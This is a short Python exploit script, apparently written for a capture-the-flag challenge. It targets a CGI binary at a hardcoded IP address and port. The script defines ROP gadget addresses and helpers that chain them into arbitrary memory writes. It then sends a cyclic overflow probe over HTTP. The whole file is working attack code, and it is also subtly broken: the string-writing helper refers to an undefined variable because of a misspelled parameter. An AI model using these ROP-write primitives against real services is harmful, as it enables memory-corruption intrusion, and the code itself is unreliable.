from pwn import *
import requests
from urllib.parse import quote
ip="94.74.101.210"
port="49430"
# sh = remote('94.74.101.210',49185)
headers = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36"
pop_rbx_rbp4=0x401206
add_rbp_3d_ebx=0x4009B8
def write_dword(target,ori,aft):
    payload=p64(pop_rbx_rbp4)+p64(0)
    payload+=p64(aft-ori)+p64(target)
    payload+=p64(0)*4
    payload+=p64(add_rbp_3d_ebx)
    return payload
def write_str(taregt,mstr):
    length=len(mstr)
    i=0
    payload=b''
    while i<length:
        tmp=mstr[i:i+4]
        tmp=tmp.ljust(4,b'\x00')
        tmp=u32(tmp)
        payload+=write_dword(target,0,tmp)
        i+=4
    return payload

payload=cyclic(0xe8)
data = payload
url = f"http://{ip}:{port}/vip.cgi"
response = requests.post(url=url,data=data)
print(response.text)

    